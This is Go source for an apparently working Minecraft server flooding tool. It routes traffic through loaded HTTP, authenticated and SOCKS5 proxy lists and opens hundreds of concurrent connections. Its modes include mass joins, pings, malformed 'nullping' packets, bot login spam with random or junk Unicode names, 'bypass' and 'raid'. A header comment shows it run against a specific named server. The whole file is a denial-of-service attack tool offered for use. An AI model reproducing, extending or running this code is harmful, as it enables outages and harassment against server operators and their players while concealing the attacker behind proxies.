// go run mc.go -host server1.clodra.com.tr:25575 -method pingjoin -cores 8 -threads 300 -protocol 754 -pmode http -pdelay 500 -proxyfile http.txt -sdelay 50 -shuffle

package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/rand"
    "encoding/base64"
    "encoding/binary"
    "errors"
    "flag"
    "fmt"
    "io"
    "log"
    "math/big"
    randd "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "time"
)

const (
    HandshakePacketID = 0x00
    StatusRequestID   = 0x00
    PingPacketID      = 0x01
    LoginStartID      = 0x00
    PlayerPositionID  = 0x12
)

type Proxy struct {
    Host     string
    Port     int
    Username string
    Password string
}

type ServerPing struct {
    Host    string
    Port    int
    Proxy   *url.URL
    Timeout time.Duration
}

var (
    proxyArray                                               []Proxy
    proxyMutex                                               sync.Mutex
    stopChan                                                 = make(chan bool)
    sdelay                                                   int
    protocolVersion, threads, cores, timeout, conc, ptimeout int
    host, proxyFile, name, mode, proxymode                   string
    shuffler                                                 bool
    Reset                                                    = "\033[0m"
    Red                                                      = "\033[31m"
    Yellow                                                   = "\033[33m"
    Blue                                                     = "\033[34m"
    Magenta                                                  = "\033[35m"
    Green                                                    = "\033[32m"
    Cyan                                                     = "\033[36m"
)

func (sp *ServerPing) dialWithProxy() (net.Conn, error) {
    proxyConn, err := net.DialTimeout("tcp", sp.Proxy.Host, sp.Timeout)
    if err != nil {
        return nil, err
    }

    req := &http.Request{
        Method: "CONNECT",
        URL:    &url.URL{Opaque: fmt.Sprintf("%s:%d", sp.Host, sp.Port)},
        Host:   fmt.Sprintf("%s:%d", sp.Host, sp.Port),
        Header: make(http.Header),
    }

    err = req.Write(proxyConn)
    if err != nil {
        return nil, err
    }
 
    resp, err := http.ReadResponse(bufio.NewReader(proxyConn), req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != 200 {
        return nil, fmt.Errorf("proxy connection failed: %s", resp.Status)
    }

    return proxyConn, nil
}

func (sp *ServerPing) connect() (net.Conn, error) {
    if sp.Proxy != nil {
        return sp.dialWithProxy()
    }
    return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", sp.Host, sp.Port), sp.Timeout)
 
}

func (sp *ServerPing) sendHandshake(conn net.Conn) error {
    buf := new(bytes.Buffer)
    buf.WriteByte(HandshakePacketID)
    WriteVarInt(buf, protocolVersion)
    WriteString(buf, sp.Host)
    binary.Write(buf, binary.BigEndian, uint16(sp.Port))
    WriteVarInt(buf, 2)
    packet := PrependLength(buf.Bytes())
    _, err := conn.Write(packet)
    return err
}

func (sp *ServerPing) readResponse(conn net.Conn) ([]byte, error) {
    length, err := ReadVarInt(conn)
    if err != nil {
        return nil, err
    }
    data := make([]byte, length)
    _, err = io.ReadFull(conn, data)
    if err != nil {
        return nil, err
    }

    return data, nil
}

func WriteVarInt(buf *bytes.Buffer, value int) {
    for {
        if (value & 0xFFFFFF80) == 0 {
            buf.WriteByte(byte(value))
            return
        }
        buf.WriteByte(byte(value&0x7F | 0x80))
        value >>= 7
    }
}

func ReadVarInt(conn net.Conn) (int, error) {
    var value int
    var size int
    for {
        b := make([]byte, 1)
        _, err := conn.Read(b)
        if err != nil {
            return 0, err
        }
        value |= (int(b[0]) & 0x7F) << (7 * size)
        size++
        if size > 5 {
            return 0, errors.New("VarInt too big mf")
        }
        if (b[0] & 0x80) == 0 {
            break
        }
    }
    return value, nil
}

func WriteString(buf *bytes.Buffer, str string) {
    WriteVarInt(buf, len(str))
    buf.WriteString(str)
}

func PrependLength(data []byte) []byte {
    length := len(data)
    buf := new(bytes.Buffer)
    WriteVarInt(buf, length)
    buf.Write(data)
    return buf.Bytes()
}

func genname(length int, mode string) string {
    var charset string
    if mode == "longnames" {
        charset = "ę™®ę™Żę™°ę™±ę™˛ę™łę™´ę™µę™¶ę™·ę™¸ę™ąę™şę™»ę™Ľę™˝ę™ľęš€ęšęš‚ęšęš„ęš…ęš†ęš‡ęšęš‰ęšŠęš‹ęšŚęšŤęšŽęšŹęšęš‘ęš’ęš“ęš”ęš•ęš–ęš—ęšęš™ęššęš›ęšśęšťęšžęšźęś˘ęśŁęś¤ęśĄęś¦ęś§ęś¨ęś©ęśŞęś«ęś¬ęś­ęś®ęśŻęś°ęś±ęś˛ęśłęś´ęśµęś¶ęś·ęś¸ęśąęśşęś»ęśĽęś˝ęśľęśżęť€ęťęť‚ęťęť„ęť…ęť†ęť‡ęťęť‰ęťŠęť‹ęťŚęťŤęťŽęťŹęťęť‘ęť’ęť“ęť”ęť•ęť–ęť—ęťęť™ęťšęť›ęťśęťťęťžęťźęť ęťˇęť˘ęťŁęť¤ęťĄęť¦ęť§ęť¨ęť©ęťŞęť«ęť¬ęť­ęť®ęťŻęť°ęť±ęť˛ęťłęť´ęťµęť¶ęť·ęť¸ęťąęťşęť»ęťĽęť˝ęťľęťżęž€ęžęž‚ęžęž„ęž…ęž†ęž‡ęžęž‰ęžŠęž‹ęžŚęžŤęžŽęžŹęžęž‘ęž’ęž“ęž”ęž•ęž–ęž—ęžęž™ęžšęž›ęžśęžťęžžęžźęž ęžˇęž˘ęžŁęž¤ęžĄęž¦ęž§ęž¨ęž©ęžŞęž«ęž¬ęž­ęž®ęžŻęž°ęž±ęž˛ęžłęž´ęžµęž¶ęž·ęž¸ęžąęžşęž»ęžĽęž˝ęžľęžż"
    } else {
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    }

    charsetRunes := []rune(charset)
    var result strings.Builder

    for i := 0; i < length; i++ {
        randInt, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charsetRunes))))
        result.WriteRune(charsetRunes[randInt.Int64()])
    }

    return result.String()
}

func spam(ctx context.Context, host string, port int, mode string, proxy Proxy, protocolVersion int, proxymode string) {
go func() {
    for {
        select {
        case <-ctx.Done():
            return
        default:
            username := genname(16, mode)
            var conn net.Conn
            var err error

            switch proxymode {
            case "socks":
                conn, err = S5([]Proxy{proxy}, host, port, time.Duration(ptimeout)*time.Millisecond)
                if err != nil {
                    return
                }
                defer conn.Close()

            case "https":
                proxyURL, err := url.Parse(fmt.Sprintf("https://%s:%d", proxy.Host, proxy.Port))
                if err != nil {
                    return
                }
                sp := &ServerPing{
                    Host:    host,
                    Port:    port,
                    Proxy:   proxyURL,
                    Timeout: time.Duration(ptimeout) * time.Millisecond,
                }
                conn, err = sp.connect()
                if err != nil {
                    return
                }
                defer conn.Close()

            case "auth":
                conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxy.Host, proxy.Port), time.Duration(ptimeout)*time.Millisecond)
                if err != nil {
                    return
                }
                defer conn.Close()
                connectRequest := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n", host, port, host, port, "Basic "+base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password)))
                _, err = conn.Write([]byte(connectRequest))
                if err != nil {
                    conn.Close()
                    return
                }

            default:
                proxyURL, err := url.Parse(fmt.Sprintf("http://%s:%d", proxy.Host, proxy.Port))
                if err != nil {
                    return
                }
                sp := &ServerPing{
                    Host:    host,
                    Port:    port,
                    Proxy:   proxyURL,
                    Timeout: time.Duration(ptimeout) * time.Millisecond,
                }
                conn, err = sp.connect()
                if err != nil {
                    return
                }
                defer conn.Close()
            }

            if conn == nil {
                 return
            }

            switch mode {
            case "join":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())

                _, err := conn.Write(packet)
                if err != nil {
        return
                }

                buf.Reset()
                buf.WriteByte(0x00)
                WriteString(buf, username)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        return
                }

            case "nullping":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 1)
                packet := PrependLength(buf.Bytes())
                _, err := conn.Write(packet)
                if err != nil {
        return
                }
                buf.Reset()
                WriteVarInt(buf, 0xFFF)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        

                }

            case "longnames":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())

                _, err := conn.Write(packet)
                if err != nil {
        return
                }

                buf.Reset()
                buf.WriteByte(0x00)
                WriteString(buf, username)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        return
                }
                handleKeepAlive(conn)

            case "bypass":
                time.Sleep(2 * time.Second)
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())
                _, err := conn.Write(packet)
                if err != nil {
        return
                }
                buf.Reset()
                buf.WriteByte(0x00)
                WriteString(buf, username)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        

                }

            case "hand":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())

                _, err := conn.Write(packet)
                if err != nil {
        return
                }

            case "cps":
                _, err := conn.Write([]byte{0x01})
                if err != nil {
        return
                }

            case "loginspam":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())

                _, err := conn.Write(packet)
                if err != nil {
          return
                }

                buf.Reset()
                buf.WriteByte(0x00)
                WriteString(buf, username)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        return
                }
                handleKeepAlive(conn)

            case "raid":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 2)
                packet := PrependLength(buf.Bytes())

                _, err := conn.Write(packet)
                if err != nil {
          return
                }

                buf.Reset()
                buf.WriteByte(0x00)
                WriteString(buf, username)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
          return
                }

                time.Sleep(time.Duration(sdelay) * time.Millisecond)
                buf.Reset()
                WriteVarInt(buf, 0x1A)
                reasonJSON := `{"text":"Connection lost"}`
                WriteString(buf, reasonJSON)

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
          return
                }

            case "pingjoin":
                actions := []string{"ping", "join"}
                actionIndex, err := RandomInt(len(actions))
                if err != nil {
        return
                }
                action := actions[actionIndex]

                switch action {
                case "ping":
                    buf := new(bytes.Buffer)
                    buf.WriteByte(0x00)
                    WriteVarInt(buf, protocolVersion)
                    WriteString(buf, host)
                    binary.Write(buf, binary.BigEndian, uint16(port))
                    WriteVarInt(buf, 1)
                    packet := PrependLength(buf.Bytes())

                    _, err := conn.Write(packet)
                    if err != nil {
        return
                    }
                    buf.Reset()
                    buf.WriteByte(0x01)
                    binary.Write(buf, binary.BigEndian, time.Now().UnixNano()/int64(time.Millisecond))

                    packet = PrependLength(buf.Bytes())
                    _, err = conn.Write(packet)
                    if err != nil {
        return
                    }

                case "join":
                    buf := new(bytes.Buffer)
                    buf.WriteByte(0x00)
                    WriteVarInt(buf, protocolVersion)
                    WriteString(buf, host)
                    binary.Write(buf, binary.BigEndian, uint16(port))
                    WriteVarInt(buf, 2)
                    packet := PrependLength(buf.Bytes())
                    _, err := conn.Write(packet)
                    if err != nil {
        return
                    }

                    buf.Reset()
                    buf.WriteByte(0x00)
                    WriteString(buf, username)
                    packet = PrependLength(buf.Bytes())
                    _, err = conn.Write(packet)
                    if err != nil {
        return
                    }
                }

            case "ping":
                buf := new(bytes.Buffer)
                buf.WriteByte(0x00)
                WriteVarInt(buf, protocolVersion)
                WriteString(buf, host)
                binary.Write(buf, binary.BigEndian, uint16(port))
                WriteVarInt(buf, 1)
                packet := PrependLength(buf.Bytes())
                _, err := conn.Write(packet)
                if err != nil {
        return
                }

                buf.Reset()
                buf.WriteByte(0x01)
                binary.Write(buf, binary.BigEndian, time.Now().UnixNano()/int64(time.Millisecond))

                packet = PrependLength(buf.Bytes())
                _, err = conn.Write(packet)
                if err != nil {
        return
                }

            default:
                return
            }
            
            time.Sleep(time.Duration(sdelay) * time.Millisecond)
        }
    }
 }()

}

func handleKeepAlive(conn net.Conn) {
    reader := bufio.NewReader(conn)
    for {
        packetLength, err := readVarInt(reader)
        if err != nil {
            return
        }
        packetData := make([]byte, packetLength)
        _, err = io.ReadFull(reader, packetData)
        if err != nil {
            return
        }

        packetID, _ := readVarInt(bytes.NewReader(packetData))
        if packetID == 0x21 || packetID == 0x05 {
            keepAliveID, _ := readVarInt(bytes.NewReader(packetData[1:]))
            conn.Write(createKeepAliveResponse(keepAliveID))
        }
    }
}

func createKeepAliveResponse(keepAliveID int) []byte {
    buf := new(bytes.Buffer)
    buf.WriteByte(0x21)
    binary.Write(buf, binary.BigEndian, int64(keepAliveID))
    return PrependLength(buf.Bytes())
}

func disconn() []byte {
    buf := new(bytes.Buffer)
    WriteVarInt(buf, 0x00)
    reason := "Connection Lost"
    WriteString(buf, reason)
    time.Sleep(time.Duration(sdelay) * time.Millisecond)
    return PrependLength(buf.Bytes())
}

func encodeString(value string) []byte {
    buf := new(bytes.Buffer)
    WriteVarInt(buf, len(value))
    buf.WriteString(value)
    return buf.Bytes()
}

func readVarInt(reader io.Reader) (int, error) {
    var numRead int
    var result int
    for {
        var byteRead byte
        if err := binary.Read(reader, binary.BigEndian, &byteRead); err != nil {
            return 0, err
        }
        value := byteRead & 0x7F
        result |= int(value) << (7 * uint(numRead))

        numRead++
        if numRead > 5 {
            return 0, errors.New("VarInt too big")
        }
        if (byteRead & 0x80) == 0 {
            break
        }
    }
    return result, nil
}

func RandomInt(max int) (int, error) {
    n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
    if err != nil {
        return 0, err
    }
    return int(n.Int64()), nil
}

func main() {
    flag.StringVar(&host, "host", "", "IP of the server")
    flag.StringVar(&mode, "method", "join", "command to execute when joined")
    flag.IntVar(&protocolVersion, "protocol", 47, "Minecraft protocol version")
    flag.IntVar(&threads, "threads", 1, "Number of threads")
    flag.IntVar(&conc, "conc", 1, "Number of threads")
    flag.IntVar(&cores, "cores", 1, "Number of CPU cores to use")
    flag.StringVar(&proxyFile, "proxyfile", "proxies.txt", "Proxy file (auth HTTP proxies only)")
    flag.StringVar(&proxymode, "pmode", "http", "proxy mode")
    flag.IntVar(&timeout, "timeout", 60, "Timeout in seconds for the attack")
    flag.IntVar(&sdelay, "sdelay", 100, "bot join delay in ms")
    flag.IntVar(&ptimeout, "pdelay", 1000, "proxy delay in ms")
    flag.BoolVar(&shuffler, "shuffle", false, "proxy shuffler")

    flag.Parse()

    if flag.NFlag() == 0 {
        fmt.Println("")
        fmt.Println("")
        fmt.Println("")
        fmt.Println(Yellow + "./pixelsmasher -host <hostname:port>  -threads <threads> -protocol <protocol-version> -proxyfile <proxies.txt> -name <botusername> -<methodname>" + Reset)
        fmt.Println("")
        fmt.Println(Green + "Methods:" + Reset)
        fmt.Println("")
        fmt.Println(Green + "1) " + Cyan + "Join" + Reset)
        fmt.Println(Green + "2) " + Cyan + "Ping" + Reset)
        fmt.Println(Green + "3) " + Cyan + "Pingjoin" + Reset)
        fmt.Println(Green + "4) " + Cyan + "Nullping" + Reset)
        fmt.Println(Green + "5) " + Cyan + "Handshake" + Reset)
        fmt.Println(Green + "6) " + Cyan + "Bypass" + Reset)
        fmt.Println(Green + "7) " + Cyan + "Cps" + Reset)
        fmt.Println(Green + "8) " + Cyan + "longnames" + Reset)
        fmt.Println(Green + "9) " + Cyan + "Loginspam" + Reset)
        fmt.Println("")
        return
    }

    runtime.GOMAXPROCS(cores)

    proxies, err := loadProxies(proxyFile, shuffler)
    if err != nil {
        fmt.Println(err)
        return
    }

    hostParts := strings.Split(host, ":")
    if len(hostParts) != 2 {
        fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
        return
    }

    host = hostParts[0]
    portStr := hostParts[1]
    port, err := strconv.Atoi(portStr)
    if err != nil {
        fmt.Printf("Invalid port: %v\n", err)
        return
    }

    fmt.Println("")
    fmt.Println("")
    fmt.Println("")
    fmt.Println(Green+"Target IP:"+Magenta, host, port)
    fmt.Println(Green+"Bot Username:"+Magenta, "Random")
    fmt.Println(Green+"Mode:"+Magenta, mode)
    fmt.Println(Green+"Proxy File:"+Magenta, proxyFile)
    fmt.Println(Green+"Cores Used:"+Magenta, cores)
    fmt.Println(Green+"Threads:"+Magenta, threads)
    fmt.Println(Green+"Proxies Loaded:"+Magenta, len(proxies))
    fmt.Println(Reset)

    var wg sync.WaitGroup
    wg.Add(conc)

    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
    defer cancel()

    for i := 0; i < conc; i++ {
        go func() {
            defer wg.Done()
            thr2(ctx, proxies, port, host, mode, protocolVersion, proxymode)
        }()
    }

    wg.Wait()

    fmt.Println("Stopping execution")
    proxyMutex.Lock()
    proxyArray = nil
    proxyMutex.Unlock()
}

func thr2(ctx context.Context, proxies []Proxy, port int, host string, mode string, protocolVersion int, proxymode string) {
    proxyIndex := 0
    for {
        select {
        case <-ctx.Done():
            return
        default:
            var wg sync.WaitGroup
            wg.Add(threads)

            for l := 0; l < threads; l++ {
                go func() {
                    defer wg.Done()
                    idx := proxyIndex % len(proxies)
                    proxyIndex++
                    proxy := proxies[idx]
                    spam(ctx, host, port, mode, proxy, protocolVersion, proxymode)
                }()
            }

            wg.Wait()
        }
    }
}

func S5C(proxy Proxy, targetHost string, targetPort int, timeout time.Duration) (net.Conn, error) {
    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxy.Host, proxy.Port), timeout)
    if err != nil {
        return nil, err
    }

    conn.SetDeadline(time.Now().Add(timeout))

    handshake := []byte{0x05, 0x01, 0x00}
    if _, err := conn.Write(handshake); err != nil {
        conn.Close()
        return nil, err
    }

    response := make([]byte, 2)
    if _, err := io.ReadFull(conn, response); err != nil {
        conn.Close()
        return nil, err
    }

    request := []byte{0x05, 0x01, 0x00}
    request = append(request, 0x03)
    request = append(request, byte(len(targetHost)))
    request = append(request, []byte(targetHost)...)
    request = append(request, byte(targetPort>>8), byte(targetPort))
    if _, err := conn.Write(request); err != nil {
        conn.Close()
        return nil, err
    }

    response = make([]byte, 10)
    if _, err := io.ReadFull(conn, response); err != nil {
        conn.Close()
        return nil, err
    }

    conn.SetDeadline(time.Time{})
    return conn, nil
}

func S5(proxies []Proxy, targetHost string, targetPort int, timeout time.Duration) (net.Conn, error) {
for {
    var wg sync.WaitGroup
    connChan := make(chan net.Conn, 1)
    errChan := make(chan error, len(proxies))

    for _, proxy := range proxies {
        wg.Add(1)
        go func(p Proxy) {
            defer wg.Done()
            conn, err := S5C(p, targetHost, targetPort, timeout)
            if err != nil {
                errChan <- err
                return
            }
            select {
            case connChan <- conn:
            default:
                conn.Close()
            }
        }(proxy)
    }

    wg.Wait()
    close(connChan)
    close(errChan)

    if conn, ok := <-connChan; ok {
        return conn, nil
    }

    var errs []error
    for err := range errChan {
        errs = append(errs, err)
    }
    return nil, fmt.Errorf("all proxies failed: %v", errs)
 }
}

func pindex(proxies []Proxy) int {
    if len(proxies) == 0 {
        log.Fatal("No proxies available (pindex)")
    }
    return randd.Intn(len(proxies))
}

func loadProxies(filePath string, shuffler bool) ([]Proxy, error) {
    file, err := os.Open(filePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var tempProxies []Proxy
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.Split(line, ":")
        if len(parts) == 2 {
            port, err := strconv.Atoi(parts[1])
            if err != nil {
                continue
            }
            tempProxies = append(tempProxies, Proxy{
                Host: parts[0],
                Port: port,
            })
        } else if len(parts) == 4 {
            port, err := strconv.Atoi(parts[1])
            if err != nil {
                continue
            }
            tempProxies = append(tempProxies, Proxy{
                Host:     parts[0],
                Port:     port,
                Username: parts[2],
                Password: parts[3],
            })
        }
    }

    if err := scanner.Err(); err != nil {
        return nil, err
    }

    if shuffler {
        shufflep(tempProxies)
    }

    proxyMutex.Lock()
    proxyArray = tempProxies
    proxyMutex.Unlock()

    return tempProxies, nil
}

func shufflep(proxies []Proxy) {
    randd.Seed(time.Now().UnixNano())
    randd.Shuffle(len(proxies), func(i, j int) {
        proxies[i], proxies[j] = proxies[j], proxies[i]
    })
}